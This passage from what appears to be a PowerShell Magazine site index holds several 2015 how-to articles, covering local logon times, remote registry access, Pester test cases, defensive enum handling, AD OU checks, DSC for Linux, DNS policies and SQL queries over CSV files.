database:\n([ADSI]\u0026#34;WinNT://computer/jaapbrasser\u0026#34;).lastlogin I created a function for this specific purpose to simply get this information from local or remote systems; the function is available in the Microsoft TechNet Script Gallery: Get-LocalLastLogonTime\nfunction Get-LocalLastLogonTime { param( [Parameter( Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName, Position=0 )] [string[]] $ComputerName, [Parameter( Mandatory )] [string[]] $UserName ) begin { $SelectSplat = @{ Property = @(\u0026#39;ComputerName\u0026#39;,\u0026#39;UserName\u0026#39;,\u0026#39;LastLogin\u0026#39;,\u0026#39;Error\u0026#39;) } } process { foreach ($Computer in $ComputerName) { if (Test-Connection -ComputerName $Computer -Count 1 -Quiet) { foreach ($User in $UserName) { $ObjectSplat = @{ ComputerName = $Computer UserName = $User Error = $null LastLogin = $null } $CurrentUser = $null $CurrentUser = try {([ADSI]\u0026#34;WinNT://$computer/$user\u0026#34;)} catch {} if ($CurrentUser.Properties.LastLogin) { $ObjectSplat.LastLogin = try { [datetime](-join $CurrentUser.Properties.LastLogin) } catch { -join $CurrentUser.Properties.LastLogin } } elseif ($CurrentUser.Properties.Name) { } else { $ObjectSplat.Error = \u0026#39;User not found\u0026#39; } New-Object -TypeName PSCustomObject -Property $ObjectSplat | Select-Object @SelectSplat } } else { $ObjectSplat = @{ ComputerName = $Computer Error = \u0026#39;Ping failed\u0026#39; } New-Object -TypeName PSCustomObject -Property $ObjectSplat | Select-Object @SelectSplat } } } } ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/06/05/pstip-get-last-login-date-for-local-account/","tags":["Tips and Tricks"],"title":"#PSTip Get last login date for local account"},{"categories":["Tips and Tricks"],"contents":"Using the Microsoft.Win32.Registry class it is possible to access both–the local registry and, more importantly, the registry of a remote system. Using the PowerShell cmdlet this is unfortunately not possible. Ravikanth posted a similar tip in PowerShell Magazine in which he uses it to retrieve SQL instance names using remote registry.\nThe following code will retrieve a list of sub keys from the HKLM:\\Software path in the registry on Server1 computer:\n$Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,Server1) $RegSubKey = $Reg.OpenSubKey(\u0026#34;System\\CurrentControlSet\u0026#34;) $Values = $RegSubKey.GetSubKeyNames() Using this information it is possible to extract a value from the subkey as well. The following code sample will extract the path parameter from the first subkey in the Software container.\n$RegPath = Join-Path \u0026#39;Software\u0026#39; $Values[1] $Reg.OpenSubKey($RegPath).GetValue(\u0026#39;Path\u0026#39;) For more information about this class and the available methods please refer to the MSDN article:\nRegistryKey Class\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/06/04/pstip-access-remote-registry-using-powershell/","tags":["Tips and Tricks"],"title":"#PSTip Access remote registry using PowerShell"},{"categories":["Pester"],"contents":"Pester has a great feature called TestCases. This feature enables you to easily call the same test code multiple times, but with different data.\nThis comes handy in two cases–triangulation and reusing test code.\nTriangulation Triangulation is one of the base principles of automated testing. You provide two or more examples of input \u0026amp; output and run it through the tested function. When done properly it will force you to come up with general implementation of the tested function.\nIn the following example we verify the behavior of the modulo operation. This operation returns the remainder of whole number division and is denoted as % in PowerShell.\nProviding just the first two test cases, we could simply fool the test and return the value of the a. But the more test cases we provide, the more certain we are that the operation in fact behaves correctly.\nAdding more test cases without the TestCases functionality would require a lot of copy-pasting and modifying the values. This is very error prone and would likely cause a lot of problems.\nWith TestCases it is as simple as this:\nDescribe \u0026#39;Test reuse\u0026#39; { It \u0026#39;Prerequisite file \u0026lt;file\u0026gt; is present\u0026#39; ` -TestCases ` @{file = \u0026#39;.\\Script1.ps1\u0026#39;}, @{file = \u0026#39;.\\Script2.ps1\u0026#39;}, @{file = \u0026#39;.\\Script3.ps1\u0026#39;} ` -Test { param ([string]$file) $file | Should Exist } } As you can see the test was executed once for each test case and produced a very clear output without barely any effort. You should also notice that you can use tokens named as the parameter names to show the input and output values for the given test case. In our example the parameters are $a, $b and $c and so the tokens are , , and .\nTest case reuse Another scenario where the TestCases feature is very useful is for testing prerequisites.\nIn the above picture you can see that the test takes a path to a script and tests if that script file exist. On the first look it might seem pretty similar to triangulation, but the test does not point to a single function. Instead it points to multiple places which are determined by the input data.\nIn code it would look like this:\nDescribe \u0026#39;Test reuse\u0026#39; { It \u0026#39;Prerequisite file is present\u0026#39; -TestCases @{file = \u0026#39;.\\Script1.ps1\u0026#39;}, @{file = \u0026#39;.\\Script2.ps1\u0026#39;}, @{file = \u0026#39;.\\Script3.ps1\u0026#39;} -Test { param ([string]$file) $file | Should Exist } } ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/06/04/pester-triangulation-and-reusing-test-cases/","tags":["Pester"],"title":"Pester: Triangulation and reusing test cases"},{"categories":["How To"],"contents":"Today I will show how to defensively script against enums and how to test invalid enum values.\nWhat is an enum? An enum is a list of identifiers that map to values of a primitive type, usually System.Int32 which is the default in C#. An example of a simple enum is the [System.ConsoleColor] enum, listing the colors you can use in PowerShell console:\n[enum]::GetNames(System.ConsoleColor) Black DarkBlue DarkGreen DarkCyan DarkRed DarkMagenta DarkYellow Gray DarkGray Blue Green Cyan Red Magenta Yellow White Can it change? Even though we usually see the enums as such, the values they contain are not definitive and might change in future version of the type. This is also marketed as one of the upsides of using enum over the boolean type, when you anticipate more than two values in the future, because you can easily add third state to true/false, on/off, up/downand so on.\nThis flexibility is great for the framework developer, who can ship his API with a newer version of his enum without forcing the consumers of the API to change their code.\nBut there is one caveat: The consumers have to be prepared for the enum to change. Let’s see an example.\nExample Let’s imagine we wrote a function that converts values “On” and “Off” of a SystemStatus enum to “Online” and “Offline” respectively. The resulting value will become part of a report that also reports status of servers and other systems, hence the Online/Offline statuses.\nThe enum and our function are implemented and tested like this; I‘ll put both the production and test code in one file for brevity:\nAdd-Type -TypeDefinition \u0026#39; namespace Nohwnd.Samples.TestingEnums { public enum SystemStatus { Off, On } } \u0026#39; function Get-UnifiedSystemStatus { param( [Parameter(Mandatory = $true)] [Nohwnd.Samples.TestingEnums.SystemStatus] $Status ) if ($Status -eq \u0026#39;Off\u0026#39;) { \u0026#39;Offline\u0026#39; } else { \u0026#39;Online\u0026#39; } } Describe \u0026#39;Get-UnifiedSystemStatus\u0026#39; { It \u0026#39;Reports Offline when Off\u0026#39; { Get-UnifiedSystemStatus Off | Should Be \u0026#39;Offline\u0026#39; } It \u0026#39;Reports Online when On\u0026#39; { Get-UnifiedSystemStatus On | Should Be \u0026#39;Online\u0026#39; } } The code first defines the SystemStatus with possible values “Off” and “On”. Then it defines a function that will translate the input value into values appropriate for our report.\nThe Get-UnifiedSystemStatus function requires its $Status parameter to be specified and to be of type [Nohwnd.Samples.TestingEnums.SystemStatus] which has only two possible values. For that reason we decided to use the if condition to translate the values.\nWe also have tests in place that both pass, so everything should be working correctly.\nUpdating to a newer version One day a new minor version of the API is released. You are not concerned with this update. After all it’s just a minor version bump and those should not include any breaking changes.\nYou update to the new version 1.2 and everything seems to work fine. You run you automated tests and they are still passing. Everything is good.\nAfter few days the users of the system start noticing something strange: Sometimes they can’t connect to the printer remotely, even though it shows that it is online.\nYou suspect there was something wrong with the update so you investigate and with some luck you find out that the SystemStatus enum was updated as such:\nAdd-Type -TypeDefinition \u0026#39; namespace Nohwnd.Samples.TestingEnums { public enum SystemStatus { Off, On, //Added new values in version 1.2 of the library Starting, Stopping, Busy } } \u0026#39; The intention was to let you see not only if the printer is on or off, but also if it’s starting, stopping or busy. This is great new functionality, but unfortunately it also means that any of the new statuses report Online in our report.\nThis also explains the user complains. When our hypothetical printers are starting (or stopping) they do not accept remote management requests, but the report shows them as Online. And online printers should not reject remote management requests.\nPreventing the issue So let’s go back to our original code and see what is wrong with it, and how to write it better next time.\nfunction Get-UnifiedSystemStatus { param( [Parameter(Mandatory = $true)] [Nohwnd.Samples.TestingEnums.SystemStatus] $Status ) if ($Status -eq \u0026#39;Off\u0026#39;) { \u0026#39;Offline\u0026#39; } else { \u0026#39;Online\u0026#39; } } The function builds on two assumptions:\n The enum has only two possible values, so only two states are possible The enum will not change in the future  Both of those assumptions are false and make our code less robust than it might be. Let’s use a little “trick” to break them both:\n[Enum]::Parse([Nohwnd.Samples.TestingEnums.SystemStatus], 999)  The static Parse method of the [System.Enum] type will happily produce a value of the given enum type even if that value is not defined in that enum type.\nIn simple words, you can get value 999 that will have type [Nohwnd.Samples.TestingEnums.SystemStatus], and successfully pass it to our function.\nIn our code this will make the if condition return “Online” for the value 999. This is something that our code did not expect, and hence it should fail rather than return incorrect value.\nLet’s bake the expected values in our code and add appropriate test:\nfunction Get-UnifiedSystemStatus { param( [Parameter(Mandatory = $true)] [ValidateSet(\u0026#39;On\u0026#39;,\u0026#39;Off\u0026#39;)] #The version 0.1 of SystemStatus enum is anticipated here, if this throws an incorrect value was  #specified. Possible causes of this are that the enum was updated with more values, or parsed value  #of the enum was provided. [Nohwnd.Samples.TestingEnums.SystemStatus] $Status ) if ($Status -eq \u0026#39;Off\u0026#39;) { \u0026#39;Offline\u0026#39; } else { \u0026#39;Online\u0026#39; } } Describe \u0026#39;Get-UnifiedSystemStatus\u0026#39; { It \u0026#39;Reports Offline when Off\u0026#39; { Get-UnifiedSystemStatus Off | Should Be \u0026#39;Offline\u0026#39; } It \u0026#39;Reports Online when On\u0026#39; { Get-UnifiedSystemStatus On | Should Be \u0026#39;Online\u0026#39; } It \u0026#39;Throws when invalid value is provided\u0026#39; { # -- Arrange $invalidValue = [int]::MaxValue$enum $enumType = [Nohwnd.Samples.TestingEnums.SystemStatus] [Enum]::IsDefined($enumType, $invalidValue) | Should Be $false # making sure the invalid value is not defined in this enum $invalidEnumValue = [Enum]::Parse($enumType, $invalidValue) # -- Act \u0026amp; Assert { Get-UnifiedSystemStatus $invalidEnumValue } | Should Throw (\u0026#39;Cannot validate argument on parameter \u0026#39;\u0026#39;Status\u0026#39;\u0026#39;. \u0026#39;+ \u0026#39;The argument \u0026#34;2147483647\u0026#34; does not belong to the set \u0026#34;On,Off\u0026#34; \u0026#39;+ \u0026#39;specified by the ValidateSet attribute. Supply an argument \u0026#39;+ \u0026#39;that is in the set and then try the command again.\u0026#39;) } } This version adds the ValidateSet parameter constraint that checks for the values that were contained in the original version of the enum and throws an exception if a different value is provided. Also notice that a comment is used to explain why the constraint is there. Without it, it would likely look like somebody just forgot to add all the values to the constraint.\nAnother way to implement this would be to manually validate if the input value belongs to the set and throw [System.ArgumentOutOfRangeException] if it does not. This has the benefit of showing the possible causes of the exception directly to the developer.\nfunction Get-UnifiedSystemStatus { param( [Parameter(Mandatory = $true)] [Nohwnd.Samples.TestingEnums.SystemStatus] $Status ) if (\u0026#39;Off\u0026#39;,\u0026#39;On\u0026#39; -notcontains $Status) { throw [ArgumentOutOfRangeException](\u0026#39;The provided value is not one of the expected values. \u0026#39; + \u0026#39;Possible causes of this exception are parsing the enum value or using a newer version of \u0026#39; + \u0026#39;the enum which contains more values than expected.\u0026#39;) } if ($Status -eq \u0026#39;Off\u0026#39;) { \u0026#39;Offline\u0026#39; } else { \u0026#39;Online\u0026#39; } } Describe \u0026#39;Get-UnifiedSystemStatus\u0026#39; { It \u0026#39;Reports Offline when Off\u0026#39; { Get-UnifiedSystemStatus Off | Should Be \u0026#39;Offline\u0026#39; } It \u0026#39;Reports Online when On\u0026#39; { Get-UnifiedSystemStatus On | Should Be \u0026#39;Online\u0026#39; } It \u0026#39;Throws when invalid value is provided\u0026#39; { # -- Arrange $invalidValue = [int]::MaxValue $enumType = [Nohwnd.Samples.TestingEnums.SystemStatus] [Enum]::IsDefined($enumType, $invalidValue ) | Should Be $false # making sure the invalid value is not defined in this enum $invalidEnumValue = [Enum]::Parse($enumType, $invalidValue) # -- Act \u0026amp; Assert { Get-UnifiedSystemStatus $invalidEnumValue } | Should Throw (\u0026#39;The provided value is not one of the expected values. \u0026#39; + \u0026#39;Possible causes of this exception are parsing the enum value \u0026#39; + \u0026#39;or using a newer version of the enum which contains more values than expected.\u0026#39;) } } In both cases an assertion that would simply check the type of the thrown exception would be very useful:\nShould Throw [SomeExceptionType] But unfortunately no such assertion is present in the Pester framework at the moment.\nReviewing the changes Let’s look at the updated code again, and imagine what would happen if we updated the enum now. To our surprise we find out that the tests would still pass. But running the report would fail, if there was at least one device in the new status that is. Failing the application on run time might be good enough, and with a bit of luck the report would fail right after the update.\nCould we make it better? We can list all the values in the enum and make the test run for all of them.\nAdd-Type -TypeDefinition \u0026#39; namespace Nohwnd.Samples.TestingEnums { public enum SystemStatus { Off, On, //Added new values in version 0.2 of the library Starting, Stopping, Busy } } \u0026#39; function Get-UnifiedSystemStatus { param( [Parameter(Mandatory = $true)] [ValidateSet(\u0026#39;On\u0026#39;,\u0026#39;Off\u0026#39;)] #The version 0.1 of SystemStatus enum is anticipated here, if this throws an incorrect value was  #specified. Possible causes of this are that the enum was updated with more values, or parsed value  #of the enum was provided. [Nohwnd.Samples.TestingEnums.SystemStatus] $Status ) if ($Status -eq \u0026#39;Off\u0026#39;) { \u0026#39;Offline\u0026#39; } else { \u0026#39;Online\u0026#39; } } Describe \u0026#39;Get-UnifiedSystemStatus\u0026#39; { It \u0026#39;Reports Offline when Off\u0026#39; { Get-UnifiedSystemStatus Off | Should Be \u0026#39;Offline\u0026#39; } It \u0026#39;Reports Online when On\u0026#39; { Get-UnifiedSystemStatus On | Should Be \u0026#39;Online\u0026#39; } It \u0026#39;Throws when invalid value is provided\u0026#39; { # -- Arrange $invalidValue = [int]::MaxValue $enumType = [Nohwnd.Samples.TestingEnums.SystemStatus] [Enum]::IsDefined($enumType, $invalidValue) | Should Be $false # making sure the invalid value is not defined in this enum $invalidEnumValue = [Enum]::Parse($enumType, $invalidValue) # -- Act \u0026amp; Assert { Get-UnifiedSystemStatus $invalidEnumValue } | Should Throw (\u0026#39;Cannot validate argument on parameter \u0026#39;\u0026#39;Status\u0026#39;\u0026#39;. \u0026#39;+ \u0026#39;The argument \u0026#34;2147483647\u0026#34; does not belong to the set \u0026#34;On,Off\u0026#34; \u0026#39;+ \u0026#39;specified by the ValidateSet attribute. Supply an argument \u0026#39;+ \u0026#39;that is in the set and then try the command again.\u0026#39;) } It \u0026#39;Can handle all defined enum values\u0026#39; { foreach ($name in [enum]::GetNames([Nohwnd.Samples.TestingEnums.SystemStatus])) { { Get-UnifiedSystemStatus $name } | Should Not Throw } } } The new test gets all the values from the enum and runs them from our function. If any of the values does not belong to the set of ‘On’,’Off’ it will fail the test.\nSummary Enums do not guarantee that their values will not change. This is something to be aware of.\nTo future proof your code you should provide incorrect enum values to your code and test it’s reaction. This is especially important for code which uses a switch statement to take an action based on value of an enum. Such switch statement often defines a default case which often remains untested until a new version of the enum is provided.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/06/02/coding-defensively-against-enums/","tags":["How To"],"title":"Coding defensively against enums"},{"categories":["Tips and Tricks"],"contents":"For some recent scripting work, I needed to find if an AD OU existed or not from a computer that is not domain-joined. I knew that the System.DirectoryServices.DirectoryEntry class can help but I wasn’t sure how to specify the path.\nWhen I finally figured out, here is how I provided path.\nNew-Object System.DirectoryServices.DirectoryEntry(\u0026#34;LDAP://DomainFQDN/OU=OUName,DC=DOMAIN,DC=Suffix\u0026#34;,\u0026#39;UserName\u0026#39;,\u0026#39;Password\u0026#39;) You need to replace the DomainFQDN in the above code sample to something like Contoso.com, OUName with the name of the organizational unit you want to find, Domain with the NETBIOS name like Contoso and finally the Suffix with COM.\nNew-Object System.DirectoryServices.DirectoryEntry(\u0026#34;LDAP://Contoso.com/OU=TestUnit,DC=Contoso,DC=com\u0026#34;,\u0026#39;administrator\u0026#39;,\u0026#39;MyP@ssw0rd\u0026#39;) If the object creation succeeds, it will return the object that will have the distinguishedname property set to the path of the OU.\nThis, of course, assumes that the credentials specified are correct. If the credentials are invalid, you will see an error that the username or password may be wrong.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/05/29/pstip-validate-if-an-active-directory-organizational-unit-exists-or-not/","tags":["Tips and Tricks"],"title":"#PSTip Validate if an Active Directory Organizational Unit exists or not"},{"categories":["PowerShell DSC","Linux"],"contents":"The day that people who love both PowerShell DSC and xplat solutions where looking for had finally arrived. Last week the first version of PowerShell DSC for Linux was released. The information we have so far is based either on the release description that can be found in the official PowerShell DSC for Linux repository on GitHub or information shared in the Release Notes published to Microsoft Download Center.\nThe most important changes:\n support for Pull mode is added, including support for partial configurations number of resources available got doubled – currently there are 10, including nxArchive, nxEnvironment, nxFile, nxFileLine, nxGroup, nxPackage, nxScript, nxService, nxSshAuthorizedKeys, and nxUser new version is available in package form, both as rpm and as deb  CTP had several issues (you could read about these issues in the series about using DSC for Linux in PowerShell Magazine) but most of them are fixed in this release:\n unlike CTP, this release works fine with WMF 4.0 and WMF 5.0, including April preview of latter (no need to clean up your MOF after it’s compiled) problem with configuration drift not being fixed is resolved schema for nxFile resource in nx module matches the one on the Linux box  If you prefer to use packages when installing software on Linux system you may also want to visit Open Group page, where you will find a package for OMI. That is the main change in OMI 1.0.8.1. If you just want to play with PowerShell DSC for Linux without investing too much time in getting compiler and libraries to work, that may be the best option for you. You can expect more details about PowerShell DSC for Linux from us soon, once we spent enough time breaking testing it!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/05/14/powershell-dsc-for-linux-released/","tags":["PowerShell DSC","Linux"],"title":"PowerShell DSC for Linux released!"},{"categories":["News"],"contents":"In this article, we will have a look at DNS Policies – a new feature in the DNS Server role introduced in Windows Server 2016 Technical Preview 2 (TP2):\nYou can configure DNS policies to specify how a DNS server responds to DNS queries. DNS responses can be based on client IP address (location), time of the day, and several other parameters. DNS policies enable location-aware DNS, traffic management, load balancing, split-brain DNS, and other scenarios.\nIn the Technical Preview, DNS Policies can be managed through PowerShell only. Whether the feature will be manageable from the DNS Server MMC-console or any other GUI tools is currently unknown, but as Jeffrey Snover stated on Twitter recently, PowerShell management is created before layering a GUI later on for most new things in Windows Server:\nBefore we can demonstrate the new feature, we must first install the DNS Server role and create a zone on a computer running Windows Server 2016 TP2:\n# Install DNS Server Install-WindowsFeature -Name DNS # List all DNS policy cmdlets Get-Command -Module DnsServer -Name *policy* # Update help for the DnsServer module; the help files already have a lot of content and examples Update-Help -Module DnsServer # Create a test zone Add-DnsServerPrimaryZone -Name powershell.no -ZoneFile powershell.no.dns Next we create traffic management policies:\n# The first two commands create client subnets by using the Add-DnsServerClientSubnet cmdlet. The client subnets are for clients in Oslo and clients in Trondheim. Add-DnsServerClientSubnet -Name OsloSubnet -IPv4Subnet \u0026#34;10.0.1.0/22\u0026#34; -PassThru Add-DnsServerClientSubnet -Name TrondheimSubnet -IPv4Subnet \u0026#34;10.0.2.0/24\u0026#34; -PassThru # The next two commands create zone scopes for Oslo and Trondheim by using the Add-DnsServerZoneScope cmdlet. Add-DnsServerZoneScope -ZoneName powershell.no -Name \u0026#34;OsloZoneScope\u0026#34; -PassThru Add-DnsServerZoneScope -ZoneName powershell.no -Name \u0026#34;TrondheimZoneScope\u0026#34; -PassThru # The next two commands add resource records for the zone powershell.no by using the Add-DnsServerResourceRecord cmdlet. # The name for both records is the same, staging, but the two records point to different addresses. The records also have different scopes. Add-DnsServerResourceRecord -ZoneName powershell.no -A -Name staging -IPv4Address \u0026#34;10.0.1.10\u0026#34; -ZoneScope \u0026#34;OsloZoneScope\u0026#34; -PassThru Add-DnsServerResourceRecord -ZoneName powershell.no -A -Name staging -IPv4Address \u0026#34;10.0.2.10\u0026#34; -ZoneScope \u0026#34;TrondheimZoneScope\u0026#34; -PassThru # The final two commands create two policies. The policies allow queries for members of different subnets. # The policies differ in scope, so that some clients receive one response to a query, while other clients receive a different response to the same query. Add-DnsServerQueryResolutionPolicy -Name \u0026#34;OsloPolicy\u0026#34; -Action ALLOW -ClientSubnet \u0026#34;eq,OsloSubnet\u0026#34; -ZoneScope \u0026#34;OsloZoneScope,1\u0026#34; -ZoneName powershell.no -PassThru Add-DnsServerQueryResolutionPolicy -Name \u0026#34;TrondheimPolicy\u0026#34; -Action ALLOW -ClientSubnet \u0026#34;eq,TrondheimSubnet\u0026#34; -ZoneScope \u0026#34;TrondheimZoneScope,1\u0026#34; -ZoneName powershell.no -PassThru Now we are ready to test if the new policies work as desired. First, we must configure the computers used for testing to use the Windows Server 2016 TP2 DNS Server for DNS queries:\nSet-DnsClientServerAddress -InterfaceAlias Ethernet -ServerAddresses 10.0.1.200 And then, we’ll use Resolve-DnsName from a computer in the Oslo subnet (10.0.1.0):\nNext, we`re doing the same DNS query from a computer in the Trondheim subnet (10.0.2.0):\nAs we can see, the expected IP addresses are returned in both scenarios.\nLet’s also test another available scenario–Time of the day.\nFirst, we modify the OsloPolicy to apply in a restricted time:\nSet-DnsServerQueryResolutionPolicy -Name \u0026#34;OsloPolicy\u0026#34; -ZoneName powershell.no -TimeOfDay \u0026#34;EQ,22:10-23:00\u0026#34; -PassThru Then we create a function for testing purposes, which will clear the DNS client cache, output the current time and perform a DNS query.\nfunction Test-DnsName { param( [string]$Name ) Clear-DnsClientCache Get-Date Resolve-DnsName -Name $Name } Test-DnsName -Name staging.powershell.no When running Test-DnsName before the allowed time of day we get an error stating that the DNS name does not exist, while after the allowed time of day the query returns the desired result:\nThis concludes our introduction to DNS Policies in Windows Server 2016, a feature that will be very useful in real world scenarios when it becomes available for production use.\nResources\nWhat’s New in DNS Server in Windows Server Technical Preview (TechNet)\nDomain Name System (DNS) Server Cmdlets (MSDN)\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/05/13/introducing-dns-policies-in-windows-server-2016-technical-preview-2/","tags":["News"],"title":"Introducing DNS Policies in Windows Server 2016 Technical Preview 2"},{"categories":["How To","SQL"],"contents":"Note: The previous version of this article relied on the 32-bit JET engine. It has been updated to use ACE, which works in both 64-bit and 32-bit environments.\nUsing Microsoft’s ACE provider, PowerShell can natively query CSV files using SQL syntax. This technique is particularly useful when processing large CSV files that could exhaust your workstation’s memory if processed using Import-Csv. For those of you already familiar with SQL syntax, it can also simplify queries. Consider the following pure PowerShell code vs. a SQL statement which produce the same results:\nImport-Csv \u0026#34;$env:TEMP\\top-tracks.csv\u0026#34; | Group-Object Artist | Select @{Name=\u0026#34;Playcount\u0026#34;;Expression={($_.group | Measure-Object -sum Playcount).sum}}, name | Where-Object { $_.Playcount -gt 5 -and $_.name -ne \u0026#39;Fall Out Boy\u0026#39;} | Sort-Object Playcount -Descending | Select -First 20 $sql = \u0026#34;SELECT TOP 20 SUM(playcount) AS playcount, artist from [$tablename] WHERE artist \u0026lt;\u0026gt; \u0026#39;Fall Out Boy\u0026#39; GROUP BY artist HAVING SUM(playcount) \u0026gt; 4 ORDER BY SUM(playcount) DESC\u0026#34; Querying CSV files using SQL can be accomplished using either ODBC (OdbcConnection) or OLEDB (OleDbconnection). Below, we will explore querying CSV files with OLEDB.\nFigure 1. Querying a CSV file using a formalized version of the scripting technique described in this article.\nGetting Started To query a CSV file using a SQL statement, we’ll follow these basic steps:\n Build the connection string Create and open a new OleDbconnection object Create a new OleDBCommand, and associate it with the OleDbconnection object Execute the SQL statement Load the results into a data table Clean up  Building the Connection String In order to provide a working example, my top tracks from Last.FM in CSV format will be downloaded and saved to a temp directory. This CSV file, which contains over 1,300 rows, has four columns: Artist, Title, Rank, and Playcount,\n$csv = \u0026#34;$env:TEMP\\top-tracks.csv\u0026#34; Invoke-WebRequest http://git.io/vvzxA | Set-Content -Path $csv $firstRowColumnNames = \u0026#34;Yes\u0026#34; $delimiter = \u0026#34;,\u0026#34; The default delimiter for an OleDb connection is a comma. Other delimiters include semicolons, tabs (`t), pipes (|), and fixed widths (FixedLength).\nIf you’re using any delimiter other than a comma, the schema.ini file must be used. Microsoft’s website suggests that FMT=Delimiter($delimiter) within the connection string works, but that has not been my experience. If you are using an alternative delimiter, use the following code to create a basic schema.ini file.\nif ($delimiter -ne \u0026#34;,\u0026#34;) { $filename = Split-Path $csv –leaf Set-Content -Path schema.ini -Value \u0026#34;[$filename]\u0026#34; Add-Content -Path schema.ini -Value \u0026#34;Format=Delimited($delimiter)\u0026#34; } If you’re using fixed width, check out Mow’s article on this topic for more information, since a lot more information is required within the schema.ini file.\nThe connection string for the OleDb connection is a little different from the more familiar SQL Server connection string. It requires a Data Source, which is the directory that the CSV file resides within. Since $csv contains this information already, we’ll parse it for that information using Split-Path. You must also specify whether the first row contains the headers. This is answered with a “Yes” or “No” by the $firstRowColumnNames variable. Note that if the first line of your CSV file does not contain the column names, OleDbconnection defaults to using F1, F2, F3, and so on for column/field names.\nFirst, we will select the ACE provider. If more than one ACE provider version is returned, we’ll just use the first one. Then, we’ll use the resulting provider name within the connection string.\n$provider = (New-Object System.Data.OleDb.OleDbEnumerator).GetElements() | Where-Object { $_.SOURCES_NAME -like \u0026#34;Microsoft.ACE.OLEDB.*\u0026#34; } if ($provider -is [system.array]) { $provider = $provider[0].SOURCES_NAME } else { $provider = $provider.SOURCES_NAME } $connstring = \u0026#34;Provider=$provider;Data Source=$(Split-Path $csv);Extended Properties=\u0026#39;text;HDR=$firstRowColumnNames;\u0026#39;;\u0026#34; Next, the table name, which is called within the actual SQL statement, is the CSV file’s name with the period replaced by a hashtag.\n$tablename = (Split-Path $csv -leaf).Replace(\u0026#34;.\u0026#34;,\u0026#34;#\u0026#34;) Crafting the SQL Statement First, we’ll create a mildly complex SQL statement that uses SELECT, SUM, WHERE, GROUP BY, HAVING, and ORDER BY. Note that the query is case-sensitive, so take special care when using the WHERE clause.\n$sql = \u0026#34;SELECT TOP 20 SUM(playcount) AS playcount, artist from [$tablename] WHERE artist \u0026lt;\u0026gt;; \u0026#39;Fall Out Boy\u0026#39; GROUP BY artist HAVING SUM(playcount) \u0026gt; 4 ORDER BY SUM(playcount) DESC, artist\u0026#34; Upon executing this query, I expect to see the top 20 artists that I’ve listened to, ranked by the number of times I’ve played their songs, but I should not see Fall Out Boy in my results, or any artists that I’ve listened to less than five times.\nIf you’re looking to test a simple SQL query, the following statement also works well:\n$sql = \u0026#34;SELECT top 10 * from table\u0026#34; A good resource for learning more about the supported SQL syntax is Microsoft Access’ SQL reference page, since it’s the same engine. If you’re wondering if you can DELETE or UPDATE records within the CSV, the answer appears to be no. You can, however, manipulate the resulting data table output, and re-export to CSV, as seen in the section titled “Data subset and UPDATE example.”\nSetting up the Connection and Executing the SQL statement In order to execute the SQL statement, an OleDbconnection object must be created, opened and associated with a new OleDBCommand object. Once the OleDBCommand’s CommandText is set to the $sql variable, we will create a DataTable object and fill it with the results.\n# Setup connection and command $conn = New-Object System.Data.OleDb.OleDbconnection $conn.ConnectionString = $connstring $conn.Open() $cmd = New-Object System.Data.OleDB.OleDBCommand $cmd.Connection = $conn $cmd.CommandText = $sql # Load into datatable $dt = New-Object System.Data.DataTable $dt.Load($cmd.ExecuteReader(\u0026#34;CloseConnection\u0026#34;)) # Clean up $cmd.dispose | Out-Null; $conn.dispose | Out-Null # Output results $dt | Format-Table -AutoSize Figure 2. Script output\n$cmd.ExecuteReader returns System.Data.Common.DbDataReader, and the easiest way to work with this in PowerShell is to place these results inside a DataTable. The CloseConnection behavior is passed to ensure that the OleDbconnection is closed once the DbDataReader object is closed.\nBringing it all together To see the script in action, just copy and paste the code below:\n$provider = (New-Object System.Data.OleDb.OleDbEnumerator).GetElements() | Where-Object { $_.SOURCES_NAME -like \u0026#34;Microsoft.ACE.OLEDB.*\u0026#34; } if ($provider -is [system.array]) { $provider = $provider[0].SOURCES_NAME } else { $provider = $provider.SOURCES_NAME } $csv = \u0026#34;$env:TEMP\\top-tracks.csv\u0026#34; $connstring = \u0026#34;Provider=$provider;Data Source=$(Split-Path $csv);Extended Properties=\u0026#39;text;HDR=$firstRowColumnNames;\u0026#39;;\u0026#34; Invoke-WebRequest http://git.io/vvzxA | Set-Content -Path $csv $firstRowColumnNames = \u0026#34;Yes\u0026#34; $delimiter = \u0026#34;,\u0026#34; $tablename = (Split-Path $csv -leaf).Replace(\u0026#34;.\u0026#34;,\u0026#34;#\u0026#34;) $sql = \u0026#34;SELECT TOP 20 SUM(playcount) AS playcount, artist from [$tablename] WHERE artist \u0026lt;\u0026gt; \u0026#39;Fall Out Boy\u0026#39; GROUP BY artist HAVING SUM(playcount) \u0026gt; 4 ORDER BY SUM(playcount) DESC, artist\u0026#34; # Setup connection and command $conn = New-Object System.Data.OleDb.OleDbconnection $conn.ConnectionString = $connstring $conn.Open() $cmd = New-Object System.Data.OleDB.OleDBCommand $cmd.Connection = $conn $cmd.CommandText = $sql # Load into datatable $dt = New-Object System.Data.DataTable $dt.Load($cmd.ExecuteReader(\u0026#34;CloseConnection\u0026#34;)) # Clean up $cmd.dispose | Out-Null; $conn.dispose | Out-Null # Output results $dt | Format-Table -AutoSize Data subset and UPDATE example You can also grab subsets of data and then manipulate the data within the resulting datatable. Here’s how:\n$sql = \u0026#34;SELECT artist, title from [$tablename] WHERE artist = \u0026#39;Bastille\u0026#39; or artist = \u0026#39;Jeff Beal\u0026#39;\u0026#34; # Setup connection and command $conn = New-Object System.Data.OleDb.OleDbconnection $conn.ConnectionString = $connstring $conn.Open() $cmd = New-Object System.Data.OleDB.OleDBCommand $cmd.Connection = $conn $cmd.CommandText = $sql # Load into datatable $dt = New-Object System.Data.DataTable $dt.Load($cmd.ExecuteReader(\u0026#34;CloseConnection\u0026#34;)) # Clean up $cmd.dispose | Out-Null; $conn.dispose | Out-Null # UPDATE example $rows = $dt.Select(\u0026#34;artist = \u0026#39;Jeff Beal\u0026#39;\u0026#34;) foreach ($row in $rows) { 